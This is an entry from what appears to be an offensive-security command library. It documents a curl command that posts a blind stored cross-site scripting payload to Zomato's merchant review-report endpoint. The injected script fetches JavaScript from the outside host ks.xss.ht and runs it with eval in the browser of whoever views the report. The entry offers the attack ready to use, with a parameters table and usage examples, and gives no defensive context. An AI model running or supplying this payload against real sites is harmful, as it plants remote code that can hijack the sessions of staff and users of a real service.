---
data: >-
  curl -X POST 'https://www.zomato.com/api/v2/merchant' -H 'X-Access-Token:
  YOUR_VALID_TOKEN' -H 'Content-Type: application/x-www-form-urlencoded' -d
  'reason_id=5&review_id=32288944&additional_text=<script>function
  b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",
  b);a.open("GET", "//ks.xss.ht");a.send();</script>'
tags:
  - xss
  - http-post
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.328Z'
id: e79a38a9-36fe-4d9e-9a59-80776db780ba
verified: false
validated: true
submitted: true
---
# post-review-report-xss

## Command

```bash
curl -X POST 'https://www.zomato.com/api/v2/merchant' -H 'X-Access-Token: YOUR_VALID_TOKEN' -H 'Content-Type: application/x-www-form-urlencoded' -d 'reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>'
```

## Description

Sends a POST request to Zomato's merchant endpoint to report a review, injecting the XSS payload in additional_text for blind storage.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'X-Access-Token: ...'` | Authentication header | Yes |
| `-d 'reason_id=5&...'` | Form data with payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.zomato.com/api/v2/merchant' -H 'X-Access-Token: TOKEN' -d 'reason_id=5&review_id=32288944&additional_text=PAYLOAD'
```

### Advanced Usage

```bash
curl -v -X POST ... (verbose for debugging)
```

## Expected Output

HTTP 200 with success JSON, e.g., {"status":"success"}. Errors if token invalid or rate-limited.

## Related

- [[Related Procedure]]
